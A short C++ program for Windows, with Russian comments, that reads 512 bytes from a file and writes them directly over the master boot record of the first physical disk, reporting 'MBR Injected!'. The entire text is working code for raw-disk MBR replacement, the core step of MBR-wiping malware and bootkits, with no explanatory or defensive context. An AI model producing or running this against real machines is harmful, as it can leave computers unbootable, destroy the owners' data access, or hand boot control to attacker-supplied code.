#include <iostream>
#include <windows.h>
#include <fileapi.h>
#include <vector>

int main() {
    const char* drivePath = "\\\\.\\PhysicalDrive0"; // Путь к физическому диску
    std::vector<BYTE> mbrData(512); // MBR имеет размер 512 байт

    // Заполнение mbrData данными MBR (например, из файла)
    // Здесь вы должны заполнить mbrData данными вашего MBR
    // Например, чтение из файла:
    HANDLE hFile = CreateFile("mbr.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "ERROR! File doesn't open!" << std::endl;
        return 1;
    }
    DWORD bytesRead;
    if (!ReadFile(hFile, mbrData.data(), mbrData.size(), &bytesRead, NULL)) {
        std::cerr << "ERROR! File read error!" << std::endl;
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    HANDLE hDrive = CreateFile(
        drivePath,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "ERROR! Disk doesn't open!" << std::endl;
        return 1;
    }

    DWORD bytesWritten;
    BOOL result = WriteFile(
        hDrive,
        mbrData.data(),
        mbrData.size(),
        &bytesWritten,
        NULL);

    if (result) {
        std::cout << "MBR Injected!" << std::endl;
    } else {
        std::cerr << "ERROR! MBR Injection errored!" << std::endl;
    }

    CloseHandle(hDrive);
    return 0;
}